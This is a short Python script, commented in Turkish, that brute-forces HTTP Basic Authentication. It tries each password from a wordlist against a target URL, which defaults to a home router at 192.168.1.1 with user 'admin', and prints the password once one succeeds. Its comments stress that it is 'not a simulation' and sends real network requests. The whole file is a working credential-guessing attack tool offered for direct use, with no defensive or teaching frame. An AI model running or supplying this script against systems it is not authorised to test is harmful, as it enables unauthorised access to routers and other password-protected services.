import requests
from requests.auth import HTTPBasicAuth
import sys

# --- REAL WORLD BRUTE FORCER ---
# SİMÜLASYON DEĞİL. GERÇEK AĞ İSTEĞİ YAPAR.

def crack_basic_auth(target_url, username, wordlist_file):
    print(f"[*] HEDEF: {target_url} | KULLANICI: {username}")
    print("[*] Saldırı başlatılıyor... (CTRL+C ile durdur)")

    try:
        with open(wordlist_file, "r") as file:
            for password in file:
                password = password.strip()
                
                # 1. GERÇEK İSTEK GÖNDERME ANI
                # Tarayıcının yaptığı işlemin aynısını kodla yapıyoruz.
                response = requests.get(target_url, auth=HTTPBasicAuth(username, password))
                
                # 2. CEVAP ANALİZİ (Status Code)
                # 200 = Başarılı (Giriş Yapıldı)
                # 401 = Yetkisiz (Şifre Yanlış)
                
                if response.status_code == 200:
                    print("\n" + "!" * 50)
                    print(f"[SUCCESS] ŞİFRE BULUNDU: {password}")
                    print("!" * 50)
                    return True
                elif response.status_code == 401:
                    # Başarısız denemeleri ekrana basıp kalabalık etmeyelim
                    sys.stdout.write(f"\r[-] Deneniyor: {password}")
                    sys.stdout.flush()
                else:
                    print(f"\n[?] Beklenmeyen Durum: {response.status_code}")

    except FileNotFoundError:
        print("\n[HATA] Şifre listesi dosyası bulunamadı!")
    except KeyboardInterrupt:
        print("\n[!] Saldırı kullanıcı tarafından durduruldu.")
    except Exception as e:
        print(f"\n[HATA] Bağlantı sorunu: {e}")

if __name__ == "__main__":
    # --- AYARLAR ---
    # Hedef modemin adresi (Genelde http://192.168.1.1)
    TARGET = "http://192.168.1.1" 
    
    # Kırılacak kullanıcı adı
    USER = "admin"
    
    # Şifrelerin olduğu dosya (Aynı klasörde 'sifreler.txt' olmalı)
    WORDLIST = "sifreler.txt"
    
    # Başlat
    crack_basic_auth(TARGET, USER, WORDLIST)